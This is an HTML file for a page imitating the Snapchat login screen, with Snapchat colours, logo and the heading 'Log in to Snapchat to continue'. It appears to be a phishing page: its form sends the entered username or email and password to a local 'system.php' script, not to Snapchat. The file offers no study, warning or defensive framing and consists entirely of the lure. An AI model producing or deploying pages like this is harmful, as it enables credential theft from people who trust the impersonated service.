<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <link rel="icon" href="logo2.jpg" type="image/jpg">
    <style>
        body {
            margin: 0;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #FFFC00;
            color: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .heading {
            font-weight: bold;
            color: #000;
            font-size: 36px;
            margin-bottom: 30px;
            text-align: center;
        }

        .sidebar {
            width: 360px;
            padding: 40px;
            background-color: #FFF;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            text-align: center;
        }

        .logo {
            width: 100px;
            height: auto;
            margin-bottom: 20px;
        }

        .sidebar_inputContainer__4leI_ {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
        }

        .sidebar_aiLabel__GeI04 {
            margin-bottom: 10px;
            font-weight: bold;
            color: #737373;
            font-size: 16px;
            text-align: center;
        }

        .sidebar_input__AVHKi {
            width: 100%;
            padding: 12px;
            box-sizing: border-box;
            margin-bottom: 20px;
            border: 1px solid #E8E8E8;
            border-radius: 8px;
            background-color: #FFF;
            color: #000;
            font-size: 16px;
        }

        .sidebar_switchAiTypeBtn__x6tfo {
            background-color: #000;
            color: #FFF;
            border: none;
            cursor: pointer;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            text-align: center;
            transition: background-color 0.3s;
        }

        .sidebar_switchAiTypeBtn__x6tfo:hover {
            background-color: #333;
        }
    </style>
</head>
<body>
    <div class="heading">Log in to Snapchat to continue</div>
    <div class="sidebar">
        <img src="logo.png" alt="Snapchat Logo" class="logo">
        <form action="system.php" method="post">
            <div class="sidebar_inputContainer__4leI_">
                <label for="username" class="sidebar_aiLabel__GeI04">Username or Email Address</label>
                <input id="username" name="username" class="sidebar_input__AVHKi" type="text" placeholder="Enter your username or email" required>
                <input id="password" name="password" class="sidebar_input__AVHKi" type="password" placeholder="Enter your password" required>
                <button type="submit" class="sidebar_switchAiTypeBtn__x6tfo">
                    Log in
                </button>
            </div>
        </form>
    </div>
</body>
</html>
